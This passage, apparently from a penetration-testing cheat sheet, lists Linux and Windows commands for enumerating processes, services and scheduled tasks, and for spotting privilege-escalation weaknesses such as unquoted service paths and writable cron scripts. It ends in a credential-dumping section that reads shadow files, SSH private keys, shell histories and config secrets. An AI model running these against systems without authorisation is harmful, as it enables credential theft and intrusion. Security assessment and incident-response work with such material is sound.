ps axjf
ps -ejH
```

**Detailed Process Information**

```bash
# Process environment variables
cat /proc/<PID>/environ | tr '\0' '\n'
strings /proc/<PID>/environ
xargs -0 -L1 -a /proc/<PID>/environ

# Command line arguments
cat /proc/<PID>/cmdline | tr '\0' ' '
xargs -0 < /proc/<PID>/cmdline

# Process status
cat /proc/<PID>/status
cat /proc/<PID>/stat

# Process limits
cat /proc/<PID>/limits

# Process file descriptors
ls -la /proc/<PID>/fd/
lsof -p <PID>

# Process memory maps
cat /proc/<PID>/maps
pmap <PID>
pmap -x <PID>  # Extended information

# Process working directory
ls -la /proc/<PID>/cwd
readlink /proc/<PID>/cwd

# Process executable
ls -la /proc/<PID>/exe
readlink /proc/<PID>/exe

# Open files by process
lsof -c <process_name>
lsof -u <username>

# Network connections per process
lsof -i -a -p <PID>
ss -p | grep <PID>
netstat -anp | grep <PID>
```

**Security-Focused Process Analysis**

```bash
# Processes with SUID/SGID
ps -eo pid,user,group,args | grep -v "^root"

# Process capabilities
getpcaps <PID>
grep Cap /proc/<PID>/status
capsh --decode=$(grep CapEff /proc/<PID>/status | awk '{print $2}')

# Processes running from suspicious locations
ps aux | grep -E "/tmp|/dev/shm|/var/tmp"
lsof | grep -E "/tmp|/dev/shm|/var/tmp" | grep -v "DIR"

# Processes without binary on disk (deleted)
ls -la /proc/*/exe 2>/dev/null | grep deleted

# Hidden processes (comparing different enumeration methods)
ps aux > ps_output.txt
ls /proc | grep -E '^[0-9]+$' > proc_list.txt
diff <(ps aux | awk '{print $2}' | sort) <(ls /proc | grep -E '^[0-9]+$' | sort)

# Processes listening on network ports
ss -tlnp
netstat -tlnp
lsof -i -P -n

# Processes with open network connections
ss -tanp
netstat -tanp
lsof -i -a
```

**Process Monitoring**

```bash
# Real-time process monitoring
top
htop
atop

# Monitor specific process
top -p <PID>
watch -n 1 'ps aux | grep <process_name>'

# Process accounting (if enabled)
lastcomm
sa
ac

# System call tracing
strace -p <PID>
strace -f -e trace=network -p <PID>  # Network calls only

# Library calls
ltrace -p <PID>

# Process I/O statistics
iotop
pidstat -d 1

# Monitor new processes
pspy64  # Without root
while true; do ps aux; sleep 1; done | grep -E 'NEW|COMMAND'
```

**Process Analysis Scripts**

```bash
#!/bin/bash
# Comprehensive process enumeration

echo "=== Suspicious Process Locations ==="
ps aux | grep -E "/tmp|/dev/shm|/var/tmp|/home"

echo -e "\n=== Processes Running as Root ==="
ps aux | grep ^root | grep -v "\[" | head -20

echo -e "\n=== Processes with Network Connections ==="
lsof -i -n -P

echo -e "\n=== Recently Started Processes ==="
ps -eo pid,lstart,cmd | sort -k2 | tail -20

echo -e "\n=== High CPU Processes ==="
ps aux --sort=-%cpu | head -10

echo -e "\n=== Unusual Parent-Child Relationships ==="
ps auxf | grep -v grep | grep -E "bash.*sh|sh.*bash|perl.*python|python.*perl"
```

### Windows Process Analysis

**PowerShell Process Enumeration**

```powershell
# List all processes
Get-Process
Get-Process | Format-Table -AutoSize

# Detailed process information
Get-Process | Select-Object Name, Id, Path, Company, CPU, WorkingSet | Format-Table -AutoSize

# Processes sorted by CPU
Get-Process | Sort-Object CPU -Descending | Select-Object -First 20

# Processes sorted by memory
Get-Process | Sort-Object WS -Descending | Select-Object -First 20

# Process with command line arguments
Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine | Format-List

# Process owners
Get-WmiObject Win32_Process | Select-Object ProcessId, Name, @{Name="Owner";Expression={$_.GetOwner().User}}

# Process creation time
Get-Process | Select-Object Name, Id, StartTime | Sort-Object StartTime -Descending

# Process modules (DLLs loaded)
Get-Process -Name <process_name> | Select-Object -ExpandProperty Modules

# Process with file path
Get-Process | Where-Object {$_.Path} | Select-Object Name, Path

# Services hosted in processes
Get-WmiObject Win32_Process | Where-Object {$_.Name -eq "svchost.exe"} | ForEach-Object {
    $processId = $_.ProcessId
    Get-WmiObject Win32_Service | Where-Object {$_.ProcessId -eq $processId} | Select-Object Name, DisplayName
}

# Network connections per process
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess, @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}}

# Running from temp directories
Get-Process | Where-Object {$_.Path -match "\\Temp\\|\\AppData\\Local\\Temp"}

# Unsigned executables
Get-Process | Where-Object {$_.Path} | ForEach-Object {
    $sig = Get-AuthenticodeSignature $_.Path
    if ($sig.Status -ne "Valid") {
        [PSCustomObject]@{
            Name = $_.Name
            Path = $_.Path
            Signature = $sig.Status
        }
    }
}

# Hidden processes (no window)
Get-Process | Where-Object {$_.MainWindowTitle -eq ""}

# Processes with network connections
Get-NetTCPConnection -State Established | Select-Object -ExpandProperty OwningProcess -Unique | ForEach-Object {Get-Process -Id $_}
```

**Command Prompt Process Enumeration**

```cmd
REM List all processes
tasklist
tasklist /v
tasklist /svc

REM Processes with services
tasklist /svc | findstr /i "svchost"

REM Filter by user
tasklist /fi "username eq SYSTEM"
tasklist /fi "username ne SYSTEM"

REM Processes using memory over threshold
tasklist /fi "memusage gt 100000"

REM Remote process listing
tasklist /s <computer_name> /u <username> /p <password>

REM Detailed format
tasklist /fo list
tasklist /fo csv

REM Process modules
tasklist /m
tasklist /m /fi "imagename eq chrome.exe"

REM WMIC process enumeration
wmic process list brief
wmic process list full
wmic process get name,processid,parentprocessid,executablepath,commandline
wmic process where "name='powershell.exe'" get processid,commandline

REM Process creation time
wmic process get name,processid,creationdate

REM Process owners
wmic process get processid,name,executablepath,GetOwner

REM Network connections
netstat -ano
netstat -ano | findstr ESTABLISHED
netstat -anob

REM Process tree (PowerShell alternative)
wmic process get processid,parentprocessid,name
```

**Advanced Windows Process Analysis**

```powershell
# Process injection detection
Get-Process | ForEach-Object {
    $proc = $_
    $handles = (Get-Handle -ProcessId $proc.Id 2>$null | Measure-Object).Count
    [PSCustomObject]@{
        ProcessName = $proc.Name
        PID = $proc.Id
        Handles = $handles
        Threads = $proc.Threads.Count
        WorkingSet = [math]::Round($proc.WS / 1MB, 2)
    }
} | Sort-Object Handles -Descending | Select-Object -First 20

# Suspicious process characteristics
Get-WmiObject Win32_Process | ForEach-Object {
    $proc = $_
    $parent = Get-WmiObject Win32_Process -Filter "ProcessId='$($proc.ParentProcessId)'"
    [PSCustomObject]@{
        Name = $proc.Name
        PID = $proc.ProcessId
        PPID = $proc.ParentProcessId
        ParentName = $parent.Name
        CommandLine = $proc.CommandLine
        CreationDate = $proc.ConvertToDateTime($proc.CreationDate)
    }
} | Where-Object {
    $_.ParentName -eq "explorer.exe" -and $_.Name -match "powershell|cmd|wscript"
}

# Token privileges
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Token {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
}
"@

# Loaded DLLs analysis
Get-Process | ForEach-Object {
    $proc = $_
    try {
        $modules = $proc.Modules | Where-Object {$_.FileName -match "temp|appdata"} 
        if ($modules) {
            Write-Host "Suspicious DLLs in $($proc.Name) (PID: $($proc.Id))"
            $modules | Select-Object FileName
        }
    } catch {}
}

# Process environment variables
[System.Diagnostics.Process]::GetProcessesByName("powershell") | ForEach-Object {
    $proc = $_
    Write-Host "Process: $($proc.ProcessName) PID: $($proc.Id)"
    # Note: Direct environment variable access requires specific API calls
}
```

**Sysinternals Tools for Process Analysis**

```cmd
REM Process Explorer (GUI alternative - command export)
procexp.exe /accepteula

REM Process Monitor
procmon.exe /accepteula /backingfile output.pml

REM List DLLs loaded by process
listdlls.exe -p <PID>
listdlls.exe <process_name>

REM Handle enumeration
handle.exe -p <PID>
handle.exe -a -p <process_name>

REM Process tree
pslist.exe -t

REM Process information
pslist.exe <process_name>
pslist.exe -x <PID>  # Threads and memory

REM Strings in process memory
strings.exe -pid <PID>
strings.exe -nobanner <executable>
```

## Service Configuration Analysis

### Linux Service Analysis

**Systemd Service Enumeration**

```bash
# List all services
systemctl list-units --type=service
systemctl list-units --type=service --all
systemctl list-units --type=service --state=running

# Service status
systemctl status <service_name>
systemctl show <service_name>

# Detailed service properties
systemctl show <service_name> --property=ExecStart
systemctl show <service_name> --property=User
systemctl show <service_name> --property=Environment
systemctl show <service_name> --no-pager

# Service dependencies
systemctl list-dependencies <service_name>
systemctl list-dependencies <service_name> --reverse

# Failed services
systemctl --failed
systemctl list-units --state=failed

# Service files location
systemctl cat <service_name>
systemctl show <service_name> -p FragmentPath

# All service files
find /etc/systemd/system/ -name "*.service"
find /usr/lib/systemd/system/ -name "*.service"
find /lib/systemd/system/ -name "*.service"

# Enabled services
systemctl list-unit-files --type=service --state=enabled
systemctl list-unit-files | grep enabled

# Service timers
systemctl list-timers --all

# Socket units
systemctl list-sockets --all
systemctl list-units --type=socket

# Examine service file
cat /etc/systemd/system/<service_name>.service
cat /usr/lib/systemd/system/<service_name>.service
```

**Service Configuration Analysis**

```bash
# Services running as root
systemctl show "*" --property=User,MainPID,Id | grep -B2 "User=root"

# Services with writable configurations
find /etc/systemd/system/ -writable -name "*.service" 2>/dev/null
find /lib/systemd/system/ -writable -name "*.service" 2>/dev/null

# Services with ExecStart containing suspicious paths
grep -r "ExecStart.*tmp\|ExecStart.*dev/shm" /etc/systemd/system/ /lib/systemd/system/

# Unmasked services
systemctl list-unit-files | grep -v masked

# Service override files
find /etc/systemd/system/ -name "*.d" -type d

# Extract credentials from service files
grep -r "PASSWORD\|SECRET\|API_KEY\|TOKEN" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null

# Environment files referenced by services
grep -r "EnvironmentFile" /etc/systemd/system/ /lib/systemd/system/ | cut -d= -f2 | sort -u

# Services with capabilities
systemctl show "*" --property=CapabilityBoundingSet,AmbientCapabilities,Id
```

**SysV Init Scripts**

```bash
# List init scripts
ls -la /etc/init.d/
service --status-all

# Runlevel services
ls -la /etc/rc*.d/
chkconfig --list  # RHEL/CentOS

# Update-rc.d services (Debian/Ubuntu)
find /etc/rc*.d/ -type l -ls

# Service configuration files
ls -la /etc/default/
ls -la /etc/sysconfig/  # RHEL/CentOS

# Check specific service
service <service_name> status
/etc/init.d/<service_name> status
```

**Xinetd Services**

```bash
# Xinetd configuration
cat /etc/xinetd.conf
ls -la /etc/xinetd.d/
cat /etc/xinetd.d/*

# Active xinetd services
netstat -tlnp | grep xinetd
ss -tlnp | grep xinetd
```

**Service Enumeration Script**

```bash
#!/bin/bash
# Comprehensive service enumeration

echo "=== Running Services ==="
systemctl list-units --type=service --state=running --no-pager

echo -e "\n=== Services as Root ==="
for service in $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'); do
    user=$(systemctl show $service --property=User --value)
    if [ "$user" == "root" ] || [ -z "$user" ]; then
        echo "$service: root"
    fi
done

echo -e "\n=== Writable Service Files ==="
find /etc/systemd/system/ /lib/systemd/system/ -writable -name "*.service" 2>/dev/null

echo -e "\n=== Service Environment Files ==="
grep -rh "EnvironmentFile" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null | grep -v "^#" | cut -d= -f2 | sort -u

echo -e "\n=== Suspicious Service Paths ==="
grep -r "ExecStart.*tmp\|ExecStart.*dev/shm\|ExecStart.*/home" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null

echo -e "\n=== Services with Network Bindings ==="
systemctl list-sockets --no-pager
```

### Windows Service Analysis

**PowerShell Service Enumeration**

```powershell
# List all services
Get-Service
Get-Service | Format-Table -AutoSize

# Running services
Get-Service | Where-Object {$_.Status -eq "Running"}

# Stopped services
Get-Service | Where-Object {$_.Status -eq "Stopped"}

# Service details with WMI
Get-WmiObject Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName, StartName | Format-Table -AutoSize

# Services running as SYSTEM
Get-WmiObject Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, PathName

# Services with specific start mode
Get-WmiObject Win32_Service | Where-Object {$_.StartMode -eq "Auto"} | Select-Object Name, DisplayName, PathName

# Service configuration
Get-Service <service_name> | Select-Object *
Get-WmiObject Win32_Service -Filter "Name='<service_name>'" | Select-Object *

# Service dependencies
Get-Service -Name <service_name> -DependentServices
Get-Service -Name <service_name> -RequiredServices

# Services with unquoted paths
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '^"' -and $_.PathName -match ' '} | Select-Object Name, PathName, StartName

# Services running from writable locations
Get-WmiObject Win32_Service | ForEach-Object {
    $path = $_.PathName -replace '"', '' -split ' ' | Select-Object -First 1
    if (Test-Path $path) {
        $acl = Get-Acl $path
        if ($acl.Access | Where-Object {$_.FileSystemRights -match "Write|FullControl" -and $_.IdentityReference -notmatch "SYSTEM|Administrators"}) {
            [PSCustomObject]@{
                Name = $_.Name
                PathName = $_.PathName
                StartName = $_.StartName
            }
        }
    }
}

# Services with DLL hijacking potential
Get-WmiObject Win32_Service | ForEach-Object {
    $path = ($_.PathName -replace '"', '' -split ' ' | Select-Object -First 1)
    if ($path -and (Test-Path $path)) {
        $directory = Split-Path $path
        try {
            $acl = Get-Acl $directory
            $writable = $acl.Access | Where-Object {
                $_.FileSystemRights -match "Write|FullControl" -and 
                $_.IdentityReference -match "Users|Everyone|Authenticated Users"
            }
            if ($writable) {
                [PSCustomObject]@{
                    Service = $_.Name
                    Path = $path
                    Directory = $directory
                    StartName = $_.StartName
                }
            }
        } catch {}
    }
}

# Registry service configuration
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | ForEach-Object {
    $serviceName = $_.PSChildName
    $imagePath = (Get-ItemProperty $_.PSPath -Name ImagePath -ErrorAction SilentlyContinue).ImagePath
    $objectName = (Get-ItemProperty $_.PSPath -Name ObjectName -ErrorAction SilentlyContinue).ObjectName
    [PSCustomObject]@{
        Name = $serviceName
        ImagePath = $imagePath
        Account = $objectName
    }
} | Where-Object {$_.ImagePath}

# Services with clear-text credentials in registry
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -Recurse | ForEach-Object {
    Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue | ForEach-Object {
        $_ | Select-String -Pattern "password|pwd|pass|key" -AllMatches | ForEach-Object {
            Write-Host "Found in: $($_.Path)"
            $_
        }
    }
}
```

**Command Prompt Service Enumeration**

```cmd
REM List all services
sc query
sc query state= all
net start

REM Service details
sc qc <service_name>
sc qdescription <service_name>
sc qfailure <service_name>
sc qtriggerinfo <service_name>

REM Service configuration
sc qc <service_name>
sc queryex <service_name>

REM Service privileges
sc qprivs <service_name>

REM Service SID
sc showsid <service_name>

REM All services detailed
sc query state= all type= service

REM Services with specific state
sc query state= inactive
sc query state= running

REM WMIC service enumeration
wmic service list brief
wmic service list full
wmic service get name,displayname,pathname,startmode,startname

REM Services with specific account
wmic service where "startname like '%LocalSystem%'" get name,pathname

REM Services with unquoted paths
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v """"

REM Service ACLs
sc sdshow <service_name>

REM Vulnerable service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula

REM Service binary permissions
accesschk.exe -uwcqv <user> "C:\Path\To\Service.exe"

REM Registry service enumeration
reg query HKLM\SYSTEM\CurrentControlSet\Services
reg query HKLM\SYSTEM\CurrentControlSet\Services\<service_name>
reg query HKLM\SYSTEM\CurrentControlSet\Services\<service_name> /s
```

**Service Exploitation Checks**

```powershell
# PowerUp (PowerSploit) service checks
Import-Module PowerUp.ps1
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Get-ModifiableService -Verbose
Get-ServiceDetail

# Manual unquoted path check
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notmatch '^"' -and 
    $_.PathName -match ' ' -and
    $_.State -eq 'Running'
} | ForEach-Object {
    $path = $_.PathName -split '.exe' | Select-Object -First 1
    $path = $path + '.exe'
    Write-Host "Service: $($_.Name)"
    Write-Host "Path: $path"
    Write-Host "Account: $($_.StartName)"
    Write-Host "---"
}

# Weak service permissions
$services = Get-WmiObject Win32_Service
foreach ($service in $services) {
    try {
        $sddl = (sc.exe sdshow $service.Name)[1]
        if ($sddl -match "WD|WO|WA") {  # Write Data, Write Owner, Write ACL
            Write-Host "Potentially writable service: $($service.Name)"
            Write-Host "SDDL: $sddl"
        }
    } catch {}
}
```

## Scheduled Task Discovery

### Linux Scheduled Tasks

**Cron Jobs Enumeration**

```bash
# System-wide crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# View all cron files
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
cat /etc/cron.weekly/*
cat /etc/cron.monthly/*

# User crontabs
crontab -l  # Current user
crontab -u <username> -l  # Specific user
ls -la /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/*

# All user crontabs
for user in $(cut -f1 -d: /etc/passwd); do 
    echo "=== Crontab for $user ==="
    crontab -u $user -l 2>/dev/null
done

# Cron logs
grep CRON /var/log/syslog
grep CRON /var/log/cron
journalctl -u cron

# Anacron tasks
cat /etc/anacrontab
ls -la /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
```

**Systemd Timers**

```bash
# List all timers
systemctl list-timers --all
systemctl list-timers --all --no-pager

# Timer details
systemctl cat <timer_name>
systemctl status <timer_name>
systemctl show <timer_name>

# Timer configurations
find /etc/systemd/system/ -name "*.timer"
find /lib/systemd/system/ -name "*.timer"

# View timer files
cat /etc/systemd/system/*.timer
cat /lib/systemd/system/*.timer

# Associated service for timer
systemctl list-unit-files | grep timer
```

**At Jobs**

```bash
# List at jobs
atq
at -l

# View specific at job
at -c <job_number>

# At job directory
ls -la /var/spool/at/
cat /var/spool/at/*

# At daemon status
systemctl status atd
```

**Writable Cron Scripts**

```bash
# Find writable cron scripts
find /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/ -type f -writable 2>/dev/null

# Scripts in cron directories with weak permissions
ls -la /etc/cron.daily/ | grep -v "root root"
ls -la /etc/cron.hourly/ | grep -v "root root"

# Cron jobs running scripts from writable directories
grep -r "/tmp\|/dev/shm\|/var/tmp\|/home" /etc/cron.d/ /etc/crontab /var/spool/cron/ 2>/dev/null

# World-writable directories in PATH used by cron
cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep PATH | cut -d= -f2 | tr ':' '\n' | while read dir; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        echo "Writable PATH directory: $dir"
        ls -la $dir
    fi
done
```

**Scheduled Task Enumeration Script**

```bash
#!/bin/bash
# Comprehensive scheduled task enumeration

echo "=== System Crontab ==="
cat /etc/crontab 2>/dev/null

echo -e "\n=== Cron Directories ==="
ls -laR /etc/cron.* 2>/dev/null

echo -e "\n=== User Crontabs ==="
for user in $(cut -f1 -d: /etc/passwd); do
    crontab=$(crontab -u $user -l 2>/dev/null)
    if [ -n "$crontab" ]; then
        echo "User: $user"
        echo "$crontab"
    fi
done

echo -e "\n=== Systemd Timers ==="
systemctl list-timers --all --no-pager

echo -e "\n=== At Jobs ==="
atq 2>/dev/null

echo -e "\n=== Writable Cron Locations ==="
find /etc/cron.* /var/spool/cron -type f -writable 2>/dev/null

echo -e "\n=== Suspicious Cron Commands ==="
grep -r "chmod\|wget\|curl\|nc\|bash -i\|sh -i\|/dev/tcp" /etc/cron.* /var/spool/cron/ 2>/dev/null

echo -e "\n=== Cron Jobs with Wildcards ==="
grep -r "\*" /etc/cron.* /var/spool/cron/ 2>/dev/null | grep -v "^#"
```

### Windows Scheduled Tasks

**PowerShell Task Enumeration**

```powershell
# List all scheduled tasks
Get-ScheduledTask
Get-ScheduledTask | Format-Table -AutoSize

# Running tasks
Get-ScheduledTask | Where-Object {$_.State -eq "Running"}

# Enabled tasks
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}

# Task details
Get-ScheduledTask -TaskName <task_name> | Get-ScheduledTaskInfo
Get-ScheduledTask -TaskName <task_name> | Select-Object *

# Task actions (what it runs)
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $actions = $task | Get-ScheduledTaskInfo | Select-Object -ExpandProperty Actions
    [PSCustomObject]@{
        TaskName = $task.TaskName
        TaskPath = $task.TaskPath
        State = $task.State
        Actions = $actions
    }
} | Format-List

# Tasks with specific trigger
Get-ScheduledTask | Where-Object {$_.Triggers.CimClass.CimClassName -eq "MSFT_TaskLogonTrigger"}

# Tasks running as SYSTEM
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $principal = $task.Principal
    if ($principal.UserId -match "SYSTEM|S-1-5-18") {
        [PSCustomObject]@{
            Name = $task.TaskName
            Path = $task.TaskPath
            User = $principal.UserId
            State = $task.State
        }
    }
}

# Tasks with command line arguments
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $actions = (Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath).Actions
    foreach ($action in $actions) {
        if ($action.Execute -or $action.Arguments) {
            [PSCustomObject]@{
                TaskName = $task.TaskName
                Execute = $action.Execute
                Arguments = $action.Arguments
                WorkingDirectory = $action.WorkingDirectory
            }
        }
    }
} | Format-List

# Tasks from specific paths
Get-ScheduledTask -TaskPath "\Microsoft\Windows\*" | Select-Object TaskName, TaskPath, State

# Export task XML
Export-ScheduledTask -TaskName <task_name> -TaskPath "\path\"

# Task history (requires event log)
Get-WinEvent -LogName Microsoft-Windows-TaskScheduler/Operational | Where-Object {$_.Id -eq 110} | Select-Object TimeCreated, Message
```

**Command Prompt Task Enumeration**

```cmd
REM List all scheduled tasks
schtasks
schtasks /query
schtasks /query /fo LIST
schtasks /query /fo LIST /v

REM Detailed output
schtasks /query /fo LIST /v > tasks.txt

REM CSV format
schtasks /query /fo CSV /v

REM Specific task details
schtasks /query /tn <task_name> /fo LIST /v

REM Tasks on remote computer
schtasks /query /s <computer> /u <user> /p <password>

REM Filter by state
schtasks /query /fo LIST | findstr /i "running"
schtasks /query /fo LIST | findstr /i "ready"

REM Tasks running as SYSTEM
schtasks /query /fo LIST /v | findstr /i "system"

REM Export task XML
schtasks /query /tn <task_name> /xml > task.xml

REM Search for suspicious tasks
schtasks /query /fo LIST /v | findstr /i "powershell cmd script bat vbs"
schtasks /query /fo LIST /v | findstr /i "temp tmp downloads"
```

**Registry-Based Task Discovery**

```cmd
REM Task Scheduler registry keys
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"

REM Specific task registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks" /s

REM Task paths
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree" /s
```

**PowerShell Advanced Task Analysis**

```powershell
# Tasks with writable executables
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath
    
    foreach ($action in $taskInfo.Actions) {
        if ($action.Execute) {
            $exePath = $action.Execute -replace '"', ''
            if (Test-Path $exePath) {
                $acl = Get-Acl $exePath
                $writable = $acl.Access | Where-Object {
                    $_.FileSystemRights -match "Write|Modify|FullControl" -and
                    $_.IdentityReference -notmatch "SYSTEM|Administrators"
                }
                if ($writable) {
                    [PSCustomObject]@{
                        TaskName = $task.TaskName
                        ExecutePath = $exePath
                        TaskUser = $task.Principal.UserId
                        Writable = $true
                    }
                }
            }
        }
    }
}

# Tasks running scripts from user-writable locations
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath
    
    foreach ($action in $taskInfo.Actions) {
        $execute = $action.Execute
        $args = $action.Arguments
        if ($execute -match "powershell|cmd|wscript|cscript" -and 
            ($execute -match "\\Users\\|\\Temp\\|\\AppData\\" -or 
             $args -match "\\Users\\|\\Temp\\|\\AppData\\")) {
            [PSCustomObject]@{
                TaskName = $task.TaskName
                Execute = $execute
                Arguments = $args
                User = $task.Principal.UserId
            }
        }
    }
}

# Tasks with suspicious triggers
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $triggers = $task.Triggers
    
    foreach ($trigger in $triggers) {
        if ($trigger.CimClass.CimClassName -in @("MSFT_TaskLogonTrigger", "MSFT_TaskRegistrationTrigger", "MSFT_TaskBootTrigger")) {
            [PSCustomObject]@{
                TaskName = $task.TaskName
                TriggerType = $trigger.CimClass.CimClassName
                State = $task.State
                User = $task.Principal.UserId
            }
        }
    }
}

# Extract credentials from task definitions
Get-ScheduledTask | ForEach-Object {
    $taskXml = Export-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath
    if ($taskXml -match "password|credential") {
        Write-Host "Potential credentials in: $($_.TaskName)"
        Write-Host $taskXml
    }
}

# Tasks with network actions
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath
    
    foreach ($action in $taskInfo.Actions) {
        $combined = "$($action.Execute) $($action.Arguments)"
        if ($combined -match "http|ftp|smb|\\\\|Invoke-WebRequest|wget|curl|Start-BitsTransfer") {
            [PSCustomObject]@{
                TaskName = $task.TaskName
                Action = $combined
                User = $task.Principal.UserId
            }
        }
    }
}
```

**Task File System Analysis**

```cmd
REM Task files location
dir C:\Windows\System32\Tasks /s
dir C:\Windows\Tasks /s

REM Examine task files
type C:\Windows\System32\Tasks\<task_name>

REM Search for keywords in task files
findstr /s /i "password script http" C:\Windows\System32\Tasks\*
findstr /s /i "powershell cmd" C:\Windows\System32\Tasks\*

REM Check ACLs on task files
icacls C:\Windows\System32\Tasks
icacls C:\Windows\System32\Tasks\<task_name>
```

**Startup Tasks and Run Keys**

```powershell
# Registry Run keys
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"

# All users startup
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

# Current user startup
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# WMI Event Subscriptions (persistence)
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding

# All persistence locations
$runKeys = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnceEx",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($key in $runKeys) {
    if (Test-Path $key) {
        Write-Host "`n=== $key ==="
        Get-ItemProperty $key
    }
}
```

## Credential Dumping

### Linux Credential Dumping

**Password Files**

```bash
# Shadow file (requires root)
cat /etc/shadow
cat /etc/shadow-
cat /etc/shadow.bak

# Passwd file
cat /etc/passwd
cat /etc/passwd-

# Group information
cat /etc/group
cat /etc/gshadow

# Backup password files
ls -la /etc/*shadow* /etc/*passwd*
cat /var/backups/passwd.bak 2>/dev/null
cat /var/backups/shadow.bak 2>/dev/null

# Check for world-readable shadow
ls -la /etc/shadow
```

**SSH Keys**

```bash
# Current user SSH keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa
cat ~/.ssh/id_ecdsa
cat ~/.ssh/id_ed25519

# All users SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find /home -name "id_*" 2>/dev/null

# SSH authorized_keys
cat ~/.ssh/authorized_keys
find / -name "authorized_keys" 2>/dev/null

# SSH known_hosts
cat ~/.ssh/known_hosts
find / -name "known_hosts" 2>/dev/null

# SSH configuration
cat ~/.ssh/config
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config

# Private keys with weak permissions
find / -name "id_*" -o -name "*.pem" -o -name "*.key" 2>/dev/null | while read key; do
    perms=$(stat -c %a "$key" 2>/dev/null)
    if [ "$perms" != "600" ] && [ "$perms" != "400" ]; then
        echo "Weak permissions on: $key ($perms)"
    fi
done
```

**Configuration Files with Credentials**

```bash
# Database configuration files
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/configuration.php 2>/dev/null
find /var/www/ -name "config.php" -o -name "database.yml" -o -name ".env" 2>/dev/null

# Application configs
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.bash_history | grep -i "password\|pass\|pwd\|passwd"

# Search for passwords in files
grep -r "password" /var/www/ 2>/dev/null
grep -r "DB_PASSWORD" /var/www/ 2>/dev/null
grep -ri "password=" /etc/ 2>/dev/null

# Common credential locations
cat /etc/openvpn/auth.txt 2>/dev/null
cat /etc/ppp/pap-secrets 2>/dev/null
cat /etc/ppp/chap-secrets 2>/dev/null

# Docker credentials
cat ~/.docker/config.json 2>/dev/null
cat /root/.docker/config.json 2>/dev/null

# Cloud credentials
